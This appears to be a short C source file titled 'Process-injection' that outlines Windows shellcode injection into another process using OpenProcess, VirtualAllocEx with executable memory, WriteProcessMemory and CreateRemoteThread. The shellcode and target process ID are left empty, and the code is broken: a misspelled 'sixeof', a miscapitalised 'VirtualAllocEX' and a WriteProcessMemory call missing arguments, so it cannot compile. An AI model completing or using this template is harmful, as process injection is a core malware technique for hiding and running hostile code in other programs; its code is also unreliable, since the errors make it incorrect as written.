# Process-injection

#include <stdio.h>
#include <windows.h>

int main()
{
    char shellcode[] = {};
    HANDLE hProcess;
    HANDLE hThread;
    void* exec_mem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, );
    exec_mem = VirtualAllocEX(hProcess, NULL, sixeof(shellcode) , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, sizeof(shellcode));
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
    CloseHandle(hProcess);
    return 0;

}
